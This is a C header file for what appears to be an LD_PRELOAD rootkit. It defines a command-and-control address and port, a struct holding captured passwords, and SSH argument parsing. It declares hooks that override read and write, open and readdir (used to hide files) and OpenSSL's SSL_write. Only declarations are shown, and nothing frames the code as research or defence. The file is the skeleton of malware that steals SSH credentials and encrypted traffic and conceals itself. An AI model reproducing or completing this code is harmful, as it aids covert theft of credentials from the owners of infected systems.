#ifndef PRELOAD_H
#define PRELOAD_H

#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <openssl/ssl.h>
#include <openssl/err.h>


// C2 CONFIGURATION
// ---------------------

#define C2_IP "172.21.0.12"
#define C2_PORT 6000


// STRUCT DEFINITIONS
// ---------------------

typedef struct pass_arg {
    char *password;
    char *arg;
} pass_args;


// FUNCTION DECLARATIONS
// ---------------------

// SSH argument parsing
void get_ssharg(char *tmp_args);
int checkifssh();

// I/O interception
ssize_t write(int fd, const void *buf, size_t nbyte);
ssize_t read(int fd, void *buf, size_t nbyte);
void *Validate(void *arg);

// Filesystem hooks
int open(const char *pathname, int flags, ...);
struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);

// Network hooks
int SSL_write(SSL *ssl, const void *buf, int num);

// Optional extensions
// int statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *buf);

#endif
